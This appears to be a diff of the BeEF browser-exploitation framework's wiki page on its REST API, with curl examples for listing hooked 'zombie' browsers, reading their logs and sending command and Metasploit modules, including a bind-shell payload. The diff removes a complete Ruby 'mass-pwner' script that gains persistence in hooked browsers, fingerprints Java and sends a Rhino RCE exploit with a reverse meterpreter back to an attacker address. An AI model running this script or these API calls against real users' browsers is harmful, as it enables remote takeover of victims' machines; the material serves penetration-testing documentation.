@@ -1,30 +1,42 @@
 ## Introduction
-From version 0.4.3.3 BeEF exposes a RESTful API. All the exchanged data uses the JSON format, for both HTTP responses and HTTP POST requests that have a body. In order to use the API, a _token_ parameter must be always added to requests, otherwise a 401 error (Not Authorized) is returned.
+From version 0.4.3.3, BeEF exposes a RESTful API allowing scripting BeEF through HTTP/JSON requests.
 
-The pseudo-random token is newly generated every time BeEF starts, using `BeEF::Core::Crypto::api_token` 
+##Authentication
+
+In order to use the API, a _token_ parameter must be always added to requests, otherwise a 401 error (Not Authorized) is returned.
+
+The pseudo-random token is newly generated every time BeEF starts, using _BeEF::Core::Crypto::api_token_ 
 and is then added to the _BeEF::Configuration_ object. It can be retrieved at any time via ruby using `BeEF::Core::Configuration.instance.get('beef.api_token')`
 
 When BeEF starts, look at the console output for 
-`[16:02:47][*] RESTful API key: 320f3cf4da7bf0df7566a517c5db796e73a23f47`. That will be the value of the _token_ parameter
+`[16:02:47][*] RESTful API key: 320f3cf4da7bf0df7566a517c5db796e73a23f47`
 
 Alternatively, for example if you want to write automated scripts that uses the RESTful API, you can issue a POST request to `/api/admin/login` using the BeEF credentials you will find in the main config.yaml file (beef.credentials).
 An example with curl: 
-`curl -H "Content-Type: application/json" -X POST -d '{"username":"beef", "password":"beef"}' http://127.0.0.1:3000/api/admin/login`
+```bash
+curl -H "Content-Type: application/json" -X POST -d '{"username":"beef", "password":"beef"}' http://127.0.0.1:3000/api/admin/login
 
-response: `{"success":true,"token":"8dc651e5ee1cb06003878bb26bd0e72800caeea0"}`
+response: {"success":true,"token":"8dc651e5ee1cb06003878bb26bd0e72800caeea0"}
+```
 
 In this way you can parse the JSON response grabbing the token, and use it for your next requests to BeEF.
 
 ## Hooked Browsers
-**Handler** => /api/hooks
-The _hooks_ handler gives information about the hooked browsers, both online and offline.
 
-**Request** => GET /api/hooks
+### Handler 
 
-`curl http://beefserver.com:3000/api/hooks?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
+* **Handler** : /api/hooks
+* Description : The _hooks_ handler gives information about the hooked browsers, both online and offline.
+* No parameters
 
-**Response**
+### Example
 
+**Request**: 
+```bash
+curl http://beefserver.com:3000/api/hooks?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
+```
+
+Response:
 ```json
 {
     "hooked-browsers": {
@@ -54,13 +66,26 @@ The _hooks_ handler gives information about the hooked browsers, both online and
                 "page_uri": "http://127.0.0.1:3000/demos/basic.html"
 }}}}
 ```
+
+## Browser's details
+
 In order to retrieve relative hooked browser details (like enabled plugins and technologies, cookies, screen size and additional info), we must specify the unique session id that identified the browser in the BeEF framework. This information can be found from the previous _/api/hooks_ call: the _session_ key value.
 
-**Request** => GET /api/hooks/:session
+### Handler
+* **Request** : GET /api/hooks/:session
+* Description : Gather informations on a hooked browser
+* Parameters : 
+  * :session : Session of the browser
 
-`curl http://beefserver.com:3000/api/hooks/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
+###Example
 
-**Response**
+**Request**:
+
+```bash
+curl http://beefserver.com:3000/api/hooks/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
+```
+
+**Response**:
 
 ```json
 { "BrowserName" : "O",
@@ -89,13 +114,18 @@ In order to retrieve relative hooked browser details (like enabled plugins and t
 ```
 
 ## Logs
-**Handler** => /api/logs
-The _logs_ handler gives information about hooked browser logs, both global and relative ones.
 
-**Request** => GET /api/logs
+### Handler
+* **URL** :  /api/logs
+* Description : The _logs_ handler gives information about hooked browser logs, both global and relative ones.
+* No parameters
 
-`curl http://beefserver.com:3000/api/logs?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
+### Example
 
+**Request** :
+```bash
+curl http://beefserver.com:3000/api/logs?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
+```
 **Response (snip)**
 
 ```json
@@ -118,11 +148,23 @@ The _logs_ handler gives information about hooked browser logs, both global and 
 }
 ```
 
+## Browser's log
+
 In order to retrieve relative hooked browser logs, so events that are logged for a specific browser, we must specify the unique session id that identified the browser in the BeEF framework. This information can be found from the previous _/api/hooks_ call: the _session_ key value.
 
-**Request** => GET /api/logs/:session
+### Handler : 
+* **URL** : GET /api/logs/:session
+* Description : Logs on one browser
+* Parameters : 
+  * session : session of the user
 
-`curl http://beefserver.com:3000/api/logs/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
+### Example
+
+** Request**:
+
+```bash
+curl http://beefserver.com:3000/api/logs/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
+```
 
 **Response (snip)**
 
@@ -157,15 +199,20 @@ In order to retrieve relative hooked browser logs, so events that are logged for
     ]
 }
 ```
-## Command Modules
-**Handler** => /api/modules
-The _modules_ handler do multiple things:
+## List Command Modules
 
-**===List all available and enabled command modules===**
+###Handler
+* **Handler** => /api/modules
+* Description : list available command modules
+* No parameters
 
-**Request** => GET /api/modules
+###Example
 
-`curl http://beefserver.com:3000/api/modules?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
+**Request** 
+
+```bash
+curl http://beefserver.com:3000/api/modules?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
+```
 
 **Response (snip)**
 
@@ -193,13 +240,23 @@ The _modules_ handler do multiple things:
     }
 }
 ```
-**===Return information about a specified module (description, category, input options)===**
 
-**Request** => GET /api/modules/:module_id
+## Informations on a specific module
 
-`curl http://beefserver.com:3000/api/modules/71?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
+### Handler
+* **URL** : GET /api/modules/:module_id
+* Description : 
+* Parameters :
+  * module_id : ID of the BeEF module
 
-**Response**
+###Example
+**Request**:
+
+```bash
+curl http://beefserver.com:3000/api/modules/71?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
+```
+
+**Response**:
 
 ```json
 {
@@ -215,15 +272,28 @@ The _modules_ handler do multiple things:
     ]
 }
 ```
-**===Send a command module to the specified hooked browser===**
+## Launch a command on a specific browser
+
+### Handler
+
+* **URL** : POST /api/modules/:session/:module_id
+* Description : launch the module given on the zombie browser given
+* Parameters :
+  * :session : session of the hooked browser
+  * :module_id : ID of the BeEF module
+  * + parameters needed for the module
+
+### Example
 
 NOTE: the request header must contain `Content-Type: application/json; charset=UTF-8` and the request body must be valid JSON. In the following example we send the _prompt-dialog_ command module: according to the previous _/api/modules/71_ call, we can specify the _question_ input with our custom value. 
 
-**Request** => POST /api/modules/:session/:module_id
+**Request** :
 
-`curl -H "Content-Type: application/json; charset=UTF-8" -d '{"question":"wtf?"}' -X POST http://beefserver.com:3000/api/modules/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk/71?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
+```bash
+curl -H "Content-Type: application/json; charset=UTF-8" -d '{"question":"wtf?"}' -X POST http://beefserver.com:3000/api/modules/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk/71?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
+```
 
-**Response**
+**Response** :
 
 ```json
 {
@@ -231,15 +301,27 @@ NOTE: the request header must contain `Content-Type: application/json; charset=U
     "command_id": "1"
 }
 ```
-**===Return information about the specific command module previously executed===**
+## Return information about the specific command module previously executed
 
 Reusing the previous example, we want to know the command module execution results (or, what the victim entered to the prompt dialog). In this case the victim entered _don't know_ :D
 
-**Request** => GET /api/modules/:session/:mod_id/:cmd_id
+### Handler
+* **URL** : GET /api/modules/:session/:mod_id/:cmd_id
+* **Description** : Returns information on the command previously launched
+* **Parameters** :
+  * :session : session of the hooked browser
+  * :mod_id : ID of the BeEF module
+  * cmd_id : id of the command launched
 
-`curl http://beefserver.com:3000/api/modules/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk/71/1?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
+### Example 
 
-**Response**
+**Request** :
+
+```bash
+curl http://beefserver.com:3000/api/modules/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk/71/1?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
+```
+
+**Response**:
 
 ```json
 {
@@ -247,13 +329,26 @@ Reusing the previous example, we want to know the command module execution resul
     "data": "{"data":"answer=don't know"}"
 }
 ```
-**===Send a Metasploit module===**
+
+## Send a Metasploit module
+
+###Handler
+* **URL** : POST /api/modules/:session/:module_id
+* **Description** : Launch a metasploit module on a given browser
+* **Parameters** :
+  * session : Session of the current browser
+  * module_id : ID of the BeEF module
+  * + Parameters needed to launch the module
+
+### Example : 
 
 NOTE: the request header must contain `Content-Type: application/json; charset=UTF-8` and the request body must be valid JSON. In the following example we send the _Adobe FlateDecode Stream Predictor 02 Integer Overflow_. Metasploit modules will be listed together with BeEF modules, marked with the _metasploit_ category.
 
-**Request** => POST /api/modules/:session/:module_id
+**Request** :
 
-`curl -H "Content-Type: application/json; charset=UTF-8" -d '{"SRVPORT":"3992", "URIPATH":"77345345345dg", "PAYLOAD":"generic/shell_bind_tcp"}' -X POST http://beefserver.com:3000/api/modules/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk/236?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
+```bash
+curl -H "Content-Type: application/json; charset=UTF-8" -d '{"SRVPORT":"3992", "URIPATH":"77345345345dg", "PAYLOAD":"generic/shell_bind_tcp"}' -X POST http://beefserver.com:3000/api/modules/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk/236?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
+```
 
 **Response**
 
@@ -266,223 +361,11 @@ This is why there is "command_id":"not_available" in the response.
     "command_id": "not_available"
 }
 ```
-## A real example: Java 1.6.0u27 mass-pwner 
-Screencast here: http://vimeo.com/41644329
-```ruby
-#
-#   Copyright 2012 Michele Orru michele.orru@antisnatchor.com
-#
-#   Licensed under the Apache License, Version 2.0 (the "License");
-#   you may not use this file except in compliance with the License.
-#   You may obtain a copy of the License at
-#
-#       http://www.apache.org/licenses/LICENSE-2.0
-#
-#   Unless required by applicable law or agreed to in writing, software
-#   distributed under the License is distributed on an "AS IS" BASIS,
-#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-#   See the License for the specific language governing permissions and
-#   limitations under the License.
-#
-# Java 1.6.0u27 mass-pwner
-# - run metasploit (./msfconsole -r ../BeEF.rc)
-# - get browser plugins
-# - get OS type and browser type/version
-# - in order to achieve persistence:
-#   - if the hooked browser is IE launch the iFrame above,
-#   - otherwise MitB
-# - launch get_system_info if java version is not exposed by plugins
-# - retrieve exact version of the JDK
-# - if JDK is vulnerable -> launch Rhino RCE exploit (reverse Java meterpreter)
-require 'rest_client'
-require 'json'
 
-# RESTful API root endpoints
-ATTACK_DOMAIN = "192.168.0.40"
-RESTAPI_HOOKS = "http://" + ATTACK_DOMAIN + ":3000/api/hooks"
-RESTAPI_LOGS = "http://" + ATTACK_DOMAIN + ":3000/api/logs"
-RESTAPI_MODULES = "http://" + ATTACK_DOMAIN + ":3000/api/modules"
-RESTAPI_ADMIN = "http://" + ATTACK_DOMAIN + ":3000/api/admin"
+## Scripts
+* [[Java-1.6.0u27 mass-pwner|Script:-Java-1.6.0u27-mass-pwner]]
 
-BEEF_USER = "beef"
-BEEF_PASSWD = "beef"
-# we also assume that BeEF and Metasploit are on the same host.
-# be sure to have "host" and "callback_host" in extensions/metasploit/config.yaml
-# with the same value of ATTACK_DOMAIN
+If you have realized any script that you would like to share with the community, please contact [Nbblr](https://github.com/Nbblrr)
 
-@token = nil
-@modules = nil
-@hooks = nil
-@meterpreter_lport = 10666
-
-def print_banner
-  puts "[>>>] JDK <= 1.6.0_27 mass pwner]"
-  puts "[>>>] uses BeEF RESTful API to control mass zombies"
-  puts "[>>>] BeEF persistence techniques used: Mitb/iframe_above"
-  puts "[>>>] MSF Rhino RCE is used to pwn the host if the detected version of Java is vulnerable"
-  puts "[>>>] [by AntiSnatchOr - 2012]"
-
-end
-
-def auth
-  response = RestClient.post "#{RESTAPI_ADMIN}/login",
-                             { 'username' => "#{BEEF_USER}",
-                               'password' => "#{BEEF_PASSWD}"}.to_json,
-                             :content_type => :json,
-                             :accept => :json
-  result = JSON.parse(response.body)
-  @token = result['token']
-  puts "[+] Retrieved RESTful API token: #{@token}"
-end
-
-def hooks
-  response = RestClient.get "#{RESTAPI_HOOKS}", {:params => {:token => @token}}
-  result = JSON.parse(response.body)
-  @hooks = result["hooked-browsers"]["online"]
-  puts "[+] Retrieved Hooked Browsers list. Online: #{@hooks.size}"
-end
-
-def modules
-  response = RestClient.get "#{RESTAPI_MODULES}", {:params => {:token => @token}}
-  @modules = JSON.parse(response.body)
-  puts "[+] Retrieved #{@modules.size} available command modules"
-end
-
-################# HELPERS #########################
-def get_module_id(mod_name)
-  @modules.each do |mod|
-    #normal modules
-    if mod_name == mod[1]["class"]
-      return mod[1]["id"]
-      break
-      # metasploit modules
-    else if mod[1]["class"] == "Msf_module" && mod_name == mod[1]["name"]
-           return mod[1]["id"]
-           break
-         end
-    end
-  end
-end
-
-def random_string(length)
-  chars = 'abcdefghjkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ'
-  result = ''
-  length.times { result << chars[rand(chars.size)] }
-  result
-end
-#//////////////////// HELPERS ///////////////////////#
-
-def get_java_version(session)
-  response = RestClient.get "#{RESTAPI_HOOKS}/#{session}", {:params => {:token => @token}}
-  result = JSON.parse(response.body)
-  java_version = nil
-  if result['JavaEnabled'] == "Yes"
-    puts "[+] Retrieving exact version of Java for Hooked Browser [#{session}]"
-    mod_id = get_module_id("Get_system_info")
-    response = RestClient.post "#{RESTAPI_MODULES}/#{session}/#{mod_id}?token=#{@token}", {}.to_json,
-                               :content_type => :json,
-                               :accept => :json
-    result = JSON.parse(response.body)
-    cmd_id = result['command_id']
-    puts "[+] Get_system_info module with command id ##{cmd_id} sent."
-    java_version = poll_for_command_results(session, mod_id, cmd_id).split("Java Version: ")[1]
-    puts "[+] Get_system_info module with command id ##{cmd_id} executed. Java Version: #{java_version}"
-  end
-  java_version
-end
-
-def poll_for_command_results(session, mod, cmd_id)
-  timeout = 30
-  java_version = ""
-  while timeout > 0 do
-    begin
-      response = RestClient.get "#{RESTAPI_MODULES}/#{session}/#{mod}/#{cmd_id}", {:params => {:token => @token}}
-      result = JSON.parse(response.body)
-      data = JSON.parse(result["data"])["data"]
-      puts "[-] Cool, got results...parsing them."
-      java_version = data[data.index("Java Version: "),22] # return something like "Java Version: 1.6.0_31"
-      break
-    rescue RestClient::ResourceNotFound  # no response yet...continue until timeout
-      puts "[-]No results yet."
-      timeout -= 2
-      sleep 2
-    end
-  end
-  java_version
-end
-
-def pwn_hooks_with_vuln_java
-  @windows_hooks = []
-  @hooks.each do |hook|
-    session = hook[1]["session"]
-    browser = "#{hook[1]["name"]}-#{hook[1]["version"]}"
-
-    #The Man-in-the-Browser module is still not supported in IE, so we use the overlay iframe_above module
-    if browser.match(/^IE/)
-      mod_id = get_module_id("Iframe_above")
-      send_iframe_above_module(session, mod_id)
-      puts "[+] Hooked browser is [#{browser}]...achieving persistence with iFrame Above module..."
-    else
-      mod_id = get_module_id("Man_in_the_browser")
-      send_mitb_module(session, mod_id)
-      puts "[+] Hooked browser is [#{browser}]...achieving persistence with Man In The Browser module..."
-    end
-
-    sleep 2
-    java_version = get_java_version(session)
-    if java_version == nil
-      puts "[--] Skipping HookedBrowser [#{browser}]. Java not enabled."
-      next
-    end
-    if java_version == "1.6.0_27" || java_version.split("1.6.0_")[1].to_i < 27
-      puts "[+] Java version [#{java_version}] IS vulnerable to Rhino Script Engine RCE exploit. Sending malicious applet..."
-      mod_id = get_module_id("Java Applet Rhino Script Engine Remote Code Execution")
-      send_msf_module(session, mod_id, "java/meterpreter/reverse_http")
-      puts "[+] Exploit [Java Applet Rhino Script Engine RCE] sent. Check your MSFconsole :D"
-    else
-      puts "[+] Java version [#{java_version}] IS NOT vulnerable to Rhino Script Engine RCE exploit. Skipping Hooked Browser."
-    end
-  end
-end
-
-def send_mitb_module(session, mod_id)
-  RestClient.post "#{RESTAPI_MODULES}/#{session}/#{mod_id}?token=#{@token}", {}.to_json,
-                             :content_type => :json,
-                             :accept => :json
-end
-
-def send_iframe_above_module(session, mod_id)
-  RestClient.post "#{RESTAPI_MODULES}/#{session}/#{mod_id}?token=#{@token}",
-                             {}.to_json,
-                             :content_type => :json,
-                             :accept => :json
-end
-
-def send_msf_module(session, mod_id, payload)
-  RestClient.post "#{RESTAPI_MODULES}/#{session}/#{mod_id}?token=#{@token}",
-                             {"SRVHOST" => "#{ATTACK_DOMAIN}",
-                              "SRVPORT" => "8080",
-                              "URIPATH" => random_string(10),
-                              "PAYLOAD" => payload,
-                              "LHOST" => "#{ATTACK_DOMAIN}",
-                              "LPORT" => @meterpreter_lport
-                             }.to_json,
-                             :content_type => :json,
-                             :accept => :json
-  @meterpreter_lport += 1
-  sleep 5
-end
-
-print_banner
-# Retrieve the RESTful API token
-auth
-# Retrieve online hooked browsers
-hooks
-# Retrieve available modules
-modules
-# Filter hooked browsers selecting only those with Java Enabled, then:
-# - in order to achieve persistence, if the hooked browser is IE launch the iFrame above, otherwise MitB
-# - launch get_system_info module to retrieve the exact version of Java
-# - if java is 1.6.0_27 or lower, launch the Rhino RCE exploit
-pwn_hooks_with_vuln_java
-```
+***
+[[Previous|Persistence]] | [[Next|Autorun]]
